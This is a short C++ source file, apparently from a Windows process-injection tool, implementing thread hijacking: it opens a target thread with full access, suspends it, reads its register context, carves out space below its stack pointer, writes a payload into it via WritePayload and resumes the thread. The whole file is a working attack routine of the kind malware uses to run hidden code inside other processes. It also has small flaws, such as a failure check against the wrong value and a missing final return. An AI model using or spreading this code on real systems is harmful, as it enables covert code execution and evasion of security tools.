#include "set_remote_memory.h"
#include "pinject_packet.h"

BOOL inject(DWORD dw_thread_id) {
	TARGET_THREAD target;
	TStrDWORD64Map run_params;
	HANDLE h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, dw_thread_id);
	if (h_thread == INVALID_HANDLE_VALUE)
		return 1;

	SuspendThread(h_thread);
	CONTEXT* p_context = new CONTEXT();
	p_context->ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(h_thread, p_context))
		return 1;

	run_params["orig_tos"] = (DWORD64)p_context->Rsp;
	run_params["tos"] = run_params["orig_tos"] - 0x2000;

	target.dwThreadId = dw_thread_id;
	target.hThread = h_thread;

	WritePayload(&target, &run_params);
	ResumeThread(h_thread);
}